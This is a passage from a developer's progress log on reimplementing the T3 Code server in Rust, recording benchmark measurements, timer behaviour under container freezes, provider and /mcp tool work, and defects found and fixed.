takes ids as any non-blank string, `\S{1,255}`), `thread show`'s `branch`, the CLI's
text when the server is gone, and the time to stop an asking run: 11 s here against 2 s,
because the stand-in answers `turn/interrupt` with an error and this server then waits its
10 s stop timeout (the helper allows about 40 s). **Version skew:** Orbit's bundle carries T3
0.1.7; this server follows T3 at the Conn pin (contract 0.1.9). The two speak to Codex
differently (0.1.7 sends no `config/read` and no `-c thread_unload_delay_secs=0`), so the
provider wire is proven against T3 at the pin (the conformance checks), not against the image.

**Measured, ours against stock, same container, 3 runs each:**

| | Conn Server | Stock T3 0.1.7 |
| --- | --- | --- |
| Unit start to readiness answer | 90 to 92 ms | 1,111 to 2,030 ms (the first on a fresh home) |
| Server process idle, `Pss` (`Private`) | 15.8 MiB (15.8); of it 2.8 MiB anon, 12.3 MiB the binary's own pages | 353 to 376 MiB (348 to 351) |
| Server process after the task-turn sequence, `Pss` | 18.2 to 18.3 MiB | 312 to 366 MiB |
| Container cgroup idle, `memory.current` (`anon`) | 145 MiB (33 MiB) | 503 to 505 MiB (378 to 381 MiB) |
| CPU of the server for the sequence | 0.19 to 0.21 s | 6.9 to 7.3 s |
| CPU of the unit (server and stand-ins) | 1.3 to 1.4 s | 8.8 to 9.2 s |
| Binary | 22.9 MB, static musl, stripped | 168 MB |
| `t3` CLI call (`auth session issue`, `thread list`) | 34 to 75 ms | 540 to 650 ms |
| Threads | 1 | |

For scale, Orbit's own T3 servers on Beast the same morning: 50 running, `Pss` 293 to 312 MiB
for three picked at the quartiles, all anon, no swap.

**Pauses** (`incus pause`, the cgroup freeze Orbit's sleep uses), our server:

- The monotonic clock runs through a freeze: `CLOCK_MONOTONIC` and `CLOCK_BOOTTIME` moved
  30.115 s, 180.17 s and 600.152 s, the same as the wall clock. So every monotonic deadline
  that passed fires once at the thaw.
- The server answers 2 to 23 ms after the resume. A turn held open by the stand-in stays
  `running` through 30 s and 10 minutes and completes when released.
- A scheduled `once` task due 2 minutes into a 3-minute pause runs at the thaw (running after
  139 ms, completed after 1.2 s).
- A 1-minute session works after 30 s and is refused after 10 minutes; the Gateway's 30-day
  session works.
- A client WebSocket on the host survives 30 s: the three pings it sent into the frozen server
  are answered at the thaw, and the next auth change reaches it. After 10 minutes the server
  closes it at the thaw (1001, "idle"): the 60 s idle timer has expired and wins over the
  buffered pings, as the timer table above says. The client reconnects and gets a new snapshot;
  the T3 client ends such a socket itself by its ping timeout.
- The provider status probe does not run: it runs only while a client holds an activity lease.
- Orbit's idle verdict (its `fromShell` rule, window 1 h): a fresh server may sleep; after a
  turn it stays awake for 1 hour from the turn; a held turn keeps it awake; a turn that waits
  for an answer reads `running` and keeps it awake, as T3 does (`idle-diff`).
- 2 hours (the fixed server): the monotonic clock moved 7,201 s with the wall clock; the
  server answered 1.1 s after the resume and did not restart; the held turn was `running` and
  completed when released; the 1-minute session was refused, the Gateway session worked. The
  host client's socket was dropped during the pause, about an hour in (close code 1006); the
  cause was not traced. The client reconnects either way.

**Restart and crash during a turn** (both servers):

| | Conn Server (after the fix) | Stock T3 0.1.7 |
| --- | --- | --- |
| `systemctl restart` | the waiting `thread start --wait` exits 1 ("Could not reach the T3 Code server …"); ready again in 1.1 to 2.1 s; the next start continues the turn ("Continue where you left off …") and it completes | the CLI exits 1; ready again in 4.4 s; the next start continues the turn (here it failed, because the stand-in had no transcript for it) |
| SIGKILL (`Restart=always` brings it back after 2 s) | CLI exits 1; ready in 2.2 to 2.4 s; the turn is continued and completes | not clean: T3 was still continuing the first thread, which took the stand-in's transcript |
| Sessions | the Gateway session survives both | survives both |

**Defects found and fixed here:**

1. **The server aborted 5 minutes after every start** (`603f741`). The periodic provider tick
   read `settings["backgroundActivity"]` from a `serde_json::Map`, which panics on a missing
   key; Orbit's settings have none. With `panic = "abort"` the server died at 5:00 and systemd
   restarted it, every 5 minutes, losing sockets, MCP sessions and running turns. Seen first at
   the thaw of a 10-minute pause, then without a pause. No check ran a server that long with an
   environment. Test: `the_periodic_tick_reads_settings_without_a_background_profile` (fails on
   the old code with the same message). In the container the fixed binary ran past 5 minutes
   and through the 10-minute pause.
2. **A turn cut by a systemd stop was lost** (`a652873`). systemd sends SIGTERM to the whole
   unit, so the Codex `app-server` exits within the server's 2 s connection drain; the engine
   marked shutdown only after the drain and stored the turn `failed`. `Engine::begin_shutdown`
   now marks it at the signal. `idle-diff` did not see it: there only the server gets the
   signal. Tests: `a_provider_that_exits_with_the_server_leaves_the_run_for_the_next_start`
   (fails without the fix) and `a_provider_that_exits_during_a_turn_fails_the_run`.

**Not proven here:** a real Claude or Codex turn in a container (stand-ins only; a Claude turn
needs the SDK host, which was not installed in the container); the WireGuard path and Orbit's
proxy device (the container was reachable only from the host); the Gateway and Swamp
themselves (their calls were replayed by hand from their code); a container under Orbit's
memory limit of 8 GiB and its swap-out at sleep; T3 at the pin in a container (only T3 0.1.7
from the bundle).

**Left on Beast:** the project `conn-server-proof` with the image and the container
`conn-proof`, running the fixed server (`a652873`); `~/conn-server-linux/README.txt` says how
to remove it.

## Orbit's task-turn path (2026-11-14)

Orbit runs a task turn with the `t3` CLI inside the container. Four items were missing; all
are built and proven against the T3 server's own CLI on macOS.

- **`t3 thread list|start|send|show`** (`crates/conn-server/src/cli_thread.rs`), as
  `apps/server/src/cli/thread.ts`: find the server through `server-runtime.json`, issue a
  30-day MCP client session (T3's scopes, label and subject) in the shared auth store, call
  `/mcp`, revoke the session at the end. `--wait` follows T3's `waitForRun` (15 s slices; a
  pending request ends it with exit 2; a completed run follows its wakes). JSON keys keep the
  contract's order (from the `/mcp` catalog). Error texts and exit codes are T3's.
- **`auth session issue --scope …`** repeated, besides `--scopes <list>`; `--json` in T3's
  key order. Every `auth` output now ends with the blank line T3's `Console.log` adds.
- **`model-manifest.json`** (`crates/conn-server/src/model_manifest.rs`), as T3's
  `ModelManifest.ts`: fetched from T3 Code's GitHub at start and then at most hourly (5 minutes
  after a failed try), only with `enableProviderUpdateChecks`, kept when it decodes and is not
  older than the bundled or cached one, written atomically. The URL, the times and the bundled
  `updatedAt` are generated (`gen-upstream.mjs`). **The server now makes this one outbound
  request, as the T3 server does.** Test seam: `CONN_MODEL_MANIFEST_URL` (`off` never
  fetches; an `http(s)` URL fetches from there). Every check sets `off`; `orbit-flow` fetches
  from a loopback stub, and also starts once with a stub that answers 500 and once with no
  listener (no file, the server ready).
- **No check reaches the network for a manifest.** Our servers get the seam `off`
  (`check.sh`, `sealed-env.mjs`, each tool that builds its own environment). T3's code in a
  check (the vitest files the conformance and replay tools write, `policies.mjs`, the T3
  servers and CLI of `parity` and `thread-cli-diff`) imports `tools/no-outside-fetch.mjs`
  first, which limits `fetch` to loopback; `parity`'s T3 server also gets
  `enableProviderUpdateChecks: false`. Before this, T3's code fetched T3 Code's manifest
  from GitHub in Claude conformance, Claude probe conformance, Claude t3-replay, Codex
  conformance and the fixture replay (37 lookups in one run, mDNSResponder's log), and
  `parity`'s T3 server could (it ran with the real HOME and default settings).
- **A project-folder launch records the folder's branch** (`EngineHost::current_branch`), as
  T3's `launchBranch`.
- Two `/mcp` faults found on the way and fixed: `t3_thread_wait` ended on a run in `waiting`
  (the step between a provider's end and its checkpoint), and it ignored
  `untilDelegatedWorkSettled` and `resultRun`; `t3_thread_launch` answered a text T3 does not
  have for an unknown instance and left a thread behind. Both now follow T3.

Proven (macOS): `thread-cli-diff` runs Orbit's commands on the T3 server with its `t3` and on
this server with ours, each with a stub `codex` and T3's recorded transcripts: 30 steps, the
same stdout, stderr and exit code, except `itemCount` (one less here): T3's launch starts
its first message deferred and records a "Workspace ready" item
(`ThreadLaunchService.ts:1209`, `Orchestrator.ts:8000-8025`); this engine starts at once and
refuses `prepared-run.*` (`commands.rs:160-163`). Orbit reads neither `itemCount` nor
`branch` (its result step, `task-copy-turn/mod.ts:77-80` at Orbit `aa33299`). It covers a turn that completes, fails and asks, a
send, unknown thread, model and provider, usage errors, no server, and `t3_copy_rpc.mjs`'s
ticket, `/ws`, `getThreadProjection`, `run.interrupt` and revoke. `model-manifest-diff`: our
file text equals T3's `encodeManifestCache`, byte for byte. `orbit-flow` runs the path in
Orbit's order on the fake provider. Not proven: Linux, a real container, a live model.

## Timers after a clock jump (2026-11-14)

Orbit freezes and wakes containers. On wake the wall clock has jumped. On Linux with the cgroup
freezer, `CLOCK_MONOTONIC` (tokio's and `std`'s `Instant`) runs on through the freeze, so every
monotonic deadline that passed fires once at the thaw. On a sleeping Mac or after a checkpoint
restore, the monotonic clock stands still. Every test below acts out the wake with a jump of
10 minutes, 2 hours and 3 days. T3 references are in `$CONN_MONOREPO/apps/server/src` at the
pin; Effect's clock reads `Date.now()` and sleeps on `setTimeout` (monotonic).

| Timer | Clock here | After a jump of 10 min / 2 h / 3 d | T3 server | Test |
| --- | --- | --- | --- | --- |
| Scheduled task timer (`conn-features/src/scheduled/mod.rs:1323`) | sleeps monotonic, at most 10 min (`MAX_SLEEP`, :71); reads the wall clock on each wake | Monotonic ran on: wakes at the thaw; an overdue interval runs once and plans from the wake; a fixed time runs if at most 10 min late, else is recorded missed once and moves to the next slot. No burst. Monotonic still: wakes within the rest of its sleep (≤ 10 min) | polls every 5 s (`scheduling/Scheduler.ts:57`); same rules (`ScheduledTaskService.ts:1242-1290`, `Schedule.ts:73-81`) | `scheduled::tests::clock_jumps` (3) |
| Idle provider session release (`conn-engine/src/engine.rs:303`, `runner.rs:99`) | reaper sleeps monotonic, 15 min; idle time by the engine's wall clock | 10 min: kept until 30 min; 2 h, 3 d: released at the next reaper wait | `Effect.sleep(idleTimeoutMs)`, monotonic (`ProviderSessionManager.ts:1487`, `:1840`) | `an_idle_session_after_a_wall_clock_jump` |
| Background hold, 4 h (`runner.rs:99`) | wall, from the first idle check | 2 h: hold starts; 3 d after it: released | `pinnedSinceMs`, wall (`ProviderSessionManager.ts:1393-1418`) | `background_work_holds_through_a_jump_until_the_wall_clock_passes_the_hold` |
| Claude query idle end (`conn-provider-claude/src/session.rs:467`) | monotonic | counts awake time only; the engine release above closes it first | the session manager's release | none of its own (engine test) |
| Provider status interval, 5 min, recheck 30 s (`conn-server/src/methods/provider.rs:298`) | monotonic sleep loop | one probe at the thaw, then every 5 min; only while a lease asks | same (`packages/provider-core/src/server/managedProvider.ts:410-430`) | `the_probe_interval_fires_once_after_a_long_freeze` |
| Client activity leases, ≤ 120 s (`provider.rs:111`) | **fixed**: both clocks, the larger elapsed wins | ended after every jump; a wall clock stepped back does not extend one | wall (`background/BackgroundPolicy.ts:61-62`, `:218-220`) | `a_lease_ends_after_a_jump_on_either_clock` |
| Pairing codes 5 min / 24 h, sessions 30 d, WebSocket ticket 5 min (`auth.rs:71-76`) | wall | 10 min: codes and tickets gone, session alive; 3 d: 24 h code gone, session alive | wall (`auth/PairingGrantStore.ts:326`, `:476`; `auth/SessionStore.ts:454-455`, `:590`) | `auth::tests::expiries_follow_the_wall_clock_after_a_freeze` |
| Socket revocation check, 30 s (`http.rs:673`); desktop parent watch, 2 s (`serve.rs:324`) | **fixed**: monotonic interval that no longer catches up | one check at the thaw; before the fix 8,640 (30 s) and 129,600 (2 s) back to back after 3 d | no such loop | `a_check_fires_once_after_a_long_freeze` (fails with the old `Burst`) |
| `/mcp` credential liveness, 24 h (`conn-mcp/src/credentials.rs:73`) | **fixed**: both clocks | 10 min, 2 h: alive; 3 d: expired until the thread's next run touches it | both clocks (`mcp/McpSessionRegistry.ts:82`, `:174`) | `a_credential_counts_idle_time_the_wall_clock_shows_after_a_freeze` |
| `/mcp` `Mcp-Session-Id`, 24 h (`conn-mcp/src/sessions.rs:12`) | monotonic | lives on if the monotonic clock stood still; the agent's next call re-initializes either way | not checked | none |
| Webhook rate and log windows, 1 min (`webhook/mod.rs:153`, `:178`, `:193`) | wall | a full window is free after any jump | wall (`ScheduledTaskService.ts:1942`, `:2304`) | `rate_and_log_windows_clear_after_a_wall_clock_jump` |
| Webhook replay keys, 7 d (`webhook/store.rs:18`, `:281`) | wall | held after 10 min, 2 h, 3 d; gone at 7 d | wall (`scheduledTasks/webhookDedupe.ts:29`, `:40-42`) | `replay_keys_hold_through_wall_clock_jumps` |
| Text generator model cache (`text_generation/mod.rs:228`) | none | never expires by time; `refresh` or a config change | the same (`textGeneration/TextGenerators.ts:146-153`) | none: no clock to move |
| Login environment refresh, 10 s (`methods/source_control.rs:288`) | monotonic | monotonic still: one refresh within 10 s of the wake may be skipped | wall (`sourceControl/SourceControlDiscovery.ts:85`, Effect `cachedWithTTL`) | none: `std::time::Instant`, no seam; the difference lasts at most 10 s, and a wall TTL would block refreshes after a wall clock stepped back |
| SDK host stop-when-idle (`conn-provider-support/src/sdk_host.rs:305`) | no timer: stops when the last query closes | follows the engine release above | T3 keeps the SDK in process | covered by the engine test and the existing host tests |
| WebSocket idle close, 60 s (`session.rs:163`, `:188`) | monotonic | monotonic ran on: the idle timer and buffered client pings are ready together; `select!` may close a live socket; the client reconnects | the server has none; the client's ping timeout ends a frozen connection (Effect `RpcClient.ts:1231`) | none |
| Short monotonic waits: flushes, debounces, request and stop timeouts, VCS and terminal polls, the run follower (24 h), title retries | monotonic, one-shot | each fires once at the thaw; none catches up | the same, on `setTimeout` | none |

Fixed: the lease, `/mcp` credential and interval rows (above). Not fixed, for Nick:

- **The scheduled task timer with a still monotonic clock.** A fixed time due shortly before the
  wake can be recorded missed where T3 runs it (the timer slept on for up to 10 minutes; the
  test shows it). In Orbit's freezer the monotonic clock runs on, so the case does not arise
  there. Options: a 5 s poll as T3 (exact, about 12 wakes a minute while a task is enabled), a
  shorter cap, or leave it.
- **The idle release counts frozen wall time as idle.** After a 2-hour freeze with a still
  monotonic clock, the provider session closes at the next reaper wait (≤ 15 min); T3 waits 30
  minutes of awake time. In Orbit both close at the thaw.

### A turn and its CLI across a freeze

The server and the provider CLI are in one container, so both freeze and thaw together. Neither
server reads the CLI's network state; both wait for the CLI to report.

- **A running turn** stays `running` through the freeze. At the thaw the CLI reads its API
  stream again. If the stream died during the freeze, the CLI's own retry logic decides: it
  retries and goes on, or it reports an error, which ends the run `failed` (Claude's result,
  Codex's `turn/completed` with an error). This server sets no turn deadline; T3 has none either.
  Stop works as always.
- **The CLI exits** (it gave up): the session's event stream ends. The engine ends a run that is
  still open as `failed`, "The provider session ended during the turn."
  (`conn-engine/src/runner.rs:997`). If the SDK host itself exits, every open query ends with
  "The SDK host exited" (`conn-provider-support/src/sdk_host.rs:466-476`). T3: `ClaudeAdapterV2.ts:249-251`
  (a query that ended before the turn), `CodexAdapterV2.ts:2694` (a Codex app-server exit ends the
  session). The exact T3 line that fails a Claude turn whose query ends mid-turn is not traced.
- **The CLI hangs** (its socket never errors): the turn stays `running` until a Stop, here and in
  T3. The idle release does not close a session with an active turn.
- **Requests in flight at the freeze** (a Codex request, an SDK host call, an ACP `initialize`):
  with the monotonic clock run on, their timeout and their answer can be ready together at the
  thaw. tokio's `timeout` polls the answer first; T3's Node event loop runs expired timers before
  it reads input, so T3 is likelier to fail such a request.

Measured on 2026-11-15 ("Proof on Beast"): `incus pause` of an Instance container keeps
`CLOCK_MONOTONIC` running (30 s, 3 min, 10 min); a held turn, a due scheduled task, session
expiry and the WebSocket idle close behave as this table says. Not proven: Orbit's own sleep
(it also swaps the container out); how the Claude and Codex CLIs behave when their API stream
died during a freeze.

## Engine, part 3: buffered delivery (2026-11-14)

The fixture replay passes 50 of 159 variants: Grok 9 of 15 (was 1), Claude 24 of 34 and Codex
17 of 25 (unchanged).

- **Buffered delivery, as T3** (`crates/conn-engine/src/streaming.rs`; T3's
  `assistantStreaming.ts`, `RunExecutionService`, `TurnItemPositionStore`). A running assistant
  node is never stored. A streaming assistant message or `assistant_message`/`reasoning` turn
  item is stored at a Markdown boundary (cut there, at most every 400 ms) or whole after 800 ms
  idle in `paragraph` mode, never in `turn` mode (`responseStreamingMode`, per project, read at
  each turn start). What is stored stays: the turn end no longer deletes streaming rows, so the
  log has no gaps. A held turn item reserves its position. Note: the brief said T3 "never
  stores" streaming rows; that holds only in `turn` mode. In its default `paragraph` mode T3
  stores each delivered snapshot, and so do we.
- **What a subscriber sees now.** Live: streamed text arrives at paragraph boundaries, not every
  100 ms; no running assistant node. Joining mid-turn: the last delivered snapshot (before: the
  last 100 ms flush, which the turn end then deleted). Stored log: the delivered snapshots stay.
- **Store version 3** drops the index of the old deletion and adds `turn_item_positions`. A
  store from `main` opens and keeps its gaps (test with an old store).
- **Idle at every turn end** (T3's `writeFinalRunEvents`): a provider terminal or a failed start
  writes the provider thread `idle` or `error` whatever its status; cancels, Force stop,
  deletes and restart recovery keep the old rule. **Refusals carry `detail`** equal to the
  reason, as T3's `ws.ts`.
- **Proofs.** T3's 13 `assistantStreaming.test.ts` cases and its fence and heading cases,
  ported; engine tests for positions, the old store, the idle write (fails on the old rule)
  and refusal bodies; the fixture replay (8 Grok variants moved out of `expected-failures.txt`;
  `queued_turn/grok` now fails only on the message-order tie, as `queued_turn/codex`).
- **Memory** (macOS, release, `memory_load`, 3 runs each). A long streamed turn (400
  snapshots, about 40 KB, one view open): peak live heap 588 to 629 KiB, against 662 to 689
  KiB on `main`. 1,000 ordinary turns: heap at the end 415 KiB (414 on `main`), peak 24.5 MiB
  (24.3, the snapshot per reopened view). The new state is bounded: at most 64 open messages
  per session, each with its delivered text, its latest text and one held snapshot.
- **Not built from that brief**, in order: merge-back and the portable fork path (T3 delivers
  the handoff through Codex `thread/inject_items` and Claude's `inlineContextLength`, both
  provider-crate changes that other workers own); prepared runs and setup scripts; a workspace
  strategy for delegated tasks; the other refused commands; bounded snapshots and the
  `/history`, `/bounded`, `/transcript` routes; NFC and T3's search ranking (`paletteSearch.ts`,
  about 1,300 lines). Commands stay 43 of 56.

## ACP provider, part 3 (2026-11-14)

- **`/compact` for Grok, as T3 serves it** (`supportsCompaction`): the native slash prompt,
  the session marked compacted on success or on the agent's `compaction_update`, T3's
  instructions and runtime notes sent again on the next prompt, the "Compact context" and
  "Context compacted" items, the context usage cleared. Prompt delivery is now recorded only
  when the prompt succeeds, as in T3. Proof: two scenarios built from the `multi_turn`
  recording (not live recordings) run through T3's own fixture runner and Grok adapter; our
  replay matches their events (12 of 17 Grok replays equal) and the stub conformance check
  matches their stdin (12 of 12).
- **Grok in the fixture replay**: the driver runs Grok on a stub `grok` that runs T3's own ACP
  replay agent. Frames are equal for the 10 non-background variants; T3's assertions pass 1
  of 15 (`turn_interrupt`, since the engine writes `idle` after a Stop). 9 fail on one engine
  difference: T3's buffered delivery never stores a running assistant node or a streaming
  message or turn item, this engine writes them and deletes them at the turn end (gaps in the
  stored sequence). 5 need Grok's background work or subagents and T3's replay gate. Each is listed in `expected-failures.txt`.
- **A command on a disabled provider instance is refused at dispatch**, as T3's
  `assertDispatchTargetEnabled` does ("Provider instance "grok" is disabled for project …";
  nothing is written). Before, the message was stored and the provider refused the session.
  `EngineHost::provider_instance_enabled` (additive); the server answers from its settings
  with T3's `resolveProjectProviderInstanceEnabled`; the two default sets are generated.
- **Memory** (macOS, `examples/idle_memory.rs`, stub agent): one idle Grok session holds about
  310 KiB of live heap on our side after one turn; 11 KiB stays after close. Not broken down;
  a likely part is the event channel: a `ProviderEvent` is 1,560 bytes and tokio's bounded
  channel allocates 32 slots (about 49 KiB) per block.
- **Not built** in this part: Grok's background work and subagents (a port of several
  thousand lines of T3 state: wake buffer, deferred finalize, continuation, subagent
  carryover; the map is in the crate README), the file and terminal host, Kiro, fx,
  Antigravity, the ACP registry, and the probe's demand gate, 30 s recheck and
  `providerStatuses` debounce.

## ACP provider, part 4 (2026-11-14)

- **Grok's background work and subagents, as T3 runs them.** Background shell tasks and
  monitors keep their tool running after the prompt settles; the turn finalizes once they
  end, 3 s after the last change. Grok's own wake turn after the settle is buffered, and the
  engine is asked for one continuation turn, which sends no prompt and replays the buffer.
  The x.ai task notifications, get-output hydration, kills, monitor events and the
  stopped-run quarantine follow T3's adapter. Native subagents become subagent rows and child
  threads with the child's text and tools; `subagent_finished` and end notices finish them.
  Proof: **17 of 17** Grok replays equal T3's events and frames (12 before; all 15 recorded
  transcripts and the 2 compaction scenarios), with T3's replay gates honoured; the stub
  conformance check sends the same bytes in **17 of 17** scenarios (12 before), the gated
  frame held across processes on both sides. Not built: subagents carried over to a later
  turn (T3's carryover), the wake reports T3 attaches to a continuation as a notification.
- **Fixture replay:** still Grok 1 of 15. The 4 background variants now wait only on the
  driver's `finish_held_run` and `release_replay_gate` steps (the engine's replay driver has
  neither); `grok_subagent_lineage` fails T3's base projection assertion, by all signs the
  same engine difference as the 9 buffered-delivery variants (not yet told apart).
- **Provider status, closer to T3:** the config stream de-dupes and debounces
  `providerStatuses` 200 ms; the periodic probe skips a disabled instance, and a failed check
  over a ready entry is kept and rechecked after 30 s. `Provider::refresh_status_on_interval`
  is a new default trait method (additive). The demand gate (T3 probes on the interval only
  while a client's activity lease asks for it) came with the Claude probe work and applies
  to Grok too.
- **The ACP registry installs nothing (Nick, 2026-11-14), a lasting gap:** no index download
  and no binary, npm or uv install will be built. Only `uninstallAcpRegistryManagedBinary`,
  `acceptAcpRegistryUrlAuth` and the user's own `local` agents may come; the other nine
  `server.*` registry methods stay unregistered and the capability unadvertised. None of the
  registry is built yet.
- **Memory:** one idle Grok session holds about 314 KiB of live heap after one turn (+321 KB;
  318 KB before); about 180 KiB of it is two 64 KiB line readers and the event channel's first
  block (see the crate README).
- **Review fixes (features review, sections 5 and 7):** Grok now gets T3's stdio `/mcp`
  bridge (`conn-server acp-mcp-bridge`, 3.9 MiB resident per agent session) instead of an
  HTTP entry; attachment paths and image blocks; `~` expanded only in T3's three variables
  (checked against the monorepo); `reasoningEffort` sent as T3 sends it on protocol 1. The
  stub conformance gained a `/mcp` scenario; the bridge's executable is the one accepted
  difference.
- **Not built in this part:** Kiro (ACP protocol 2 replies), fx, Antigravity, the file and
  terminal host (`ProviderHost`), the registry's two offline methods and local agents.

## Reviews

On 2026-11-13 six reviews ran (Gemini 4 Carbon), and a second agent (Claude Opus 5.5) checked
every finding with tests. All confirmed "fix now" findings are fixed on `main`, each with a
test: a search that could stop the server; the wrong provider after a model switch; `/mcp`
write tools without a caller check; settings secrets sent to clients; a scope hole on
`POST /api/projects/mutate`; a pairing code lost on a failed write; worktree files refused.
Each of these was our own difference from the T3 server, not a T3 behaviour. That is worth
remembering: an own server brings its own defects.

## `/mcp` tools, batch 1 (2026-11-14)

`/mcp` serves 20 of 87 tools, up from 16: `send_to_user`, `t3_thread_organize` (with T3's
settle at the end of the agent's own turn), `t3_queue` and `t3_thread_configure`, each with
a unit test and parity steps. `t3_thread_search` now reads the engine's message index with
T3's slot rule; its ranking is not ported. The argument check now answers type, length,
range and literal failures in Effect's words and keeps `null` where the schema takes it
(generated). `crates/conn-mcp/README.md` has a table of all 87 tools with what each unserved
one needs. 17 tools that a text we send to an agent names are still not served; a test holds
that list.

## Scheduled tasks and annotations (2026-11-14)

`scheduledTasks.subscribe`, `upsert`, `setEnabled`, `delete`, `runNow` and the `/mcp` tools
`schedule_task`, `list_scheduled_tasks`, `delete_scheduled_task`, `run_scheduled_task_now`
(`crates/conn-features`). One timer sleeps until the next run; no poll. Proven by 31 ported
unit tests on a paused clock, the real client's decoders, and `parity.mjs` (no differences).
`runNow` stops with its caller and records a failure, as T3 (2026-11-14). Webhook tasks are
served since 2026-11-14 (see above), without coalescing windows and the relay. `fresh_session` tasks are served since part 2 of the engine work (below). Annotations
(`annotations.*` and the four `annotations_*` tools) on the T3 server's own files, also with
parity. `docs/conn-only-areas.md`
maps the Conn-only areas and what each needs.

## Settings secrets, webhook tasks, text generator headers (2026-11-14)

- **Settings secrets in the T3 server's store.** `settings.json` now holds `••••••` where a
  secret is saved; the value is in `<state>/secrets/<name>.bin` under the T3 server's names
  (folder 0700, files 0600). An inline field secret moves there at start, as in T3; saves
  write, keep and remove store entries as `persistSettingsSecrets`, and undo them when the
  file cannot be written. The server's own code (`SettingsStore::raw`) reads the values, so
  text generators and source control host tokens work with a folder the T3 server wrote (a
  marker without a file reads as no token, so `GH_TOKEN` is tried). Proof: unit tests on
  T3's names, `settings-diff.mjs` (stored file in T3's form, 18 cases), and a new check,
  `secrets-interop.mjs`: the T3 server's own settings service and this server on shared
  folders, 5 cases (a folder from before the change, saves by either server, a key used by a
  text generator request).
- **Webhook scheduled tasks.** `rotateWebhookToken`, `listWebhookDeliveries`,
  `getWebhookDelivery`, webhook saves and `/api/hooks/<task id>/<token>` are served
  (`crates/conn-features/README.md`, "Webhook tasks"). Proof: 16 ported service tests, the
  store's tests, 29 ported tests of the template, filter and signature code, a new check
  `webhook-diff.mjs` (T3's own functions, 140 cases, no difference), and `effect-client.mjs`
  (the 3 methods decode; HEAD, a body over 1 MiB, chunked or not, a wrong token and bad
  paths are refused as T3 refuses them). Not built: coalescing windows (a save with
  `coalesceKey` is refused), the T3 Connect relay, `secretRef`, managed policy.
- **Text generator requests** carry the headers Node's fetch adds (`accept`,
  `accept-language`, `sec-fetch-mode`, `user-agent: node`, `accept-encoding: gzip, deflate`,
  `connection: keep-alive`); gzip and deflate answers decode within 8 MiB. `textgen-diff.mjs`
  now compares every header but `host` and `content-length`, with compressed answers.
  Assistant quotes in a title context become their text (`assistantCitationsToPlainText`).

## Text generators and thread titles (2026-11-14)

Nick decided to serve text generators as the T3 server does. `server.listTextGeneratorModels`
is served, so the client's "Add text generator" wizard can save; saving, changing and removing
a generator was already served by `server.updateSettings` (3 more `settings-diff` cases).
Thread titles are generated through a text generator: T3's prompt (generated from
`buildThreadTitlePrompt`), its reply rules, three tries for a first title. When the title model
is an agent provider (Codex by default, or Claude), the T3 server asks that provider; this
server does not call it, and the thread keeps its seed title. The key is in the T3 server's secret store, with the other settings secrets.
Proven by 23 unit tests on a loopback stub, the client's decoders, and `textgen-diff.mjs`
(a new check: T3's own code and ours against one stub, 102 comparisons). Map, what is sent and
when, and the differences: `docs/server-area.md`, "Text generators". Commit messages, pull
request text and branch names need parts that are not built.

The generator `gen-contract.mjs` now writes a redacting `Debug` for every secret field of the
contract (17 types, among them the webhook signature and the secret answer), with a test.

## Repositories and the login-shell PATH (2026-11-14)

`sourceControl.lookupRepository`, `cloneRepository` and `publishRepository` are served
(`crates/conn-source-control/src/repository.rs`), with the host calls of all 7 hosts (Forgejo and
GitCafe since part 3, below). Proven by the cases of T3's
`SourceControlRepositoryService.test.ts` on local bare repositories and a stub `git`, by each
host's argv, paths and bodies against stub CLIs and a loopback server, and by the real client's
decoders. The deviations are in the crate README, "Repositories".

The login shell's `PATH` (with `__MISE_DIFF` and `JAVA_HOME`) now reaches every child process
without `std::env::set_var`: `conn_support::login_env` reads it at start and before discovery
(at most every 10 s), and every spawn site adds it.

## Provider interface, brought up to the T3 server's (2026-11-14)

Closed, each with a test or a T3 recording: Claude's read-only sandbox and `dontAsk` (the
three failing T3 transcripts pass; the replay takes each scenario's policy from T3's fixture
table); a model change during a turn (sent to the running session; Claude applies effort live
and never a new model, as T3; ours used to send `set_model`); Codex Stop that waits and offers
Force stop (`InterruptTimeout`, `run_interrupt_request` with `unresponsiveAt`, Force stop's own
result); fork with the fork's model and cwd; background work as T3 derives it for the shell
and `/mcp` (`derivePendingBackgroundWork`, compared with T3's own function); `ThreadInUse`
from Codex; a Codex restart continuation starts the native turn without input; MCP servers
at open; the session row from `open_session`; `planSelectionTransition` in the engine;
continuation turns through `start_turn`; the SDK host client in `conn-provider-support`.
Trait additions with no provider behind them yet: `ProviderHost` (only a rooted file host),
`stop_task`, `await_background_tasks`, `background_work.updated` (Claude reports its roster on
the provider thread since 2026-11-14, as T3; it sends no `background_work.updated`, as T3).

## Checkpoints, rollback and fork (2026-11-14)

Each turn is captured as a git checkpoint the T3 way (`conn-vcs` `checkpoint.rs`, engine
`checkpoint.rs`): T3's refs in the workspace's own repository, a scratch index, a baseline
before the provider turn, the run `waiting` until the capture completes it, a `checkpoint`
turn item with the changed files. `getTurnDiff` and `getFullThreadDiff` are served.
`checkpoint.rollback` (provider rollback, file restore in an isolated worktree, stale refs,
`rolled_back` runs, `rollbackFailure`) and `thread.fork` (native fork only) are handled.
Proofs: engine tests on scratch repositories, `client-check.mjs` (changed files, a rewind, a
fork's lineage and graph through the client's own code), `effect-client.mjs` for both diff
methods. T3's `thread_rollback` (Codex, Claude) and `thread_rollback_to_stopped_turn` fixtures pass
through this engine (the replay check below); `thread_rollback_after_restart` passes T3's
assertions but sends one frame less. Not proven: `thread_fork_native*` and
`thread_merge_back_siblings` (T3 drives them from its own integration tests, not the fixture
table); a live Claude or Codex rollback or fork. Measured (macOS, 50 fake turns, one file each, a
200-file repository): live heap 428 KiB without and 430 KiB with checkpoints; `.git` grew from
924 to 1,736 KiB (about 16 KiB per checkpoint); the database from 1.31 to 1.76 MB.

## Claude interrupt as the T3 server does it (2026-11-14)

The T3 server closes the Claude query after a Stop (`ClaudeAdapterV2.ts` `interruptTurn`:
`interrupt` at most 10 s, then `query.close`, then up to 10 s for the CLI to exit, else
`InterruptTimeout` and Force stop). Its effect outbox runs a thread's effects one at a time
(`EffectOutbox.ts`, the claim query), so the next turn starts after the CLI exited, in a new
CLI with `--resume`. Ours only sent `interrupt` and kept the CLI for the next turn: a
difference the CLI could see. The conformance check hid it, because its T3 side did not wait
for the Stop and raced the close (it failed once on a loaded machine).

Now the provider closes and waits as T3 does, and holds a turn start behind a running Stop.
The conformance harness waits for the Stop, as the outbox does: `interrupt` compares 2 CLI
starts, the new `interrupt_twice` 3. Our engine still runs a thread's effects side by side;
only the Claude provider orders Stop and start. Not done: a Stop while no Claude turn runs
(T3's `requestRuntimeRestart` closes the query then, for background work; our engine does not
call the provider without a running turn).

## The server area (2026-11-14)

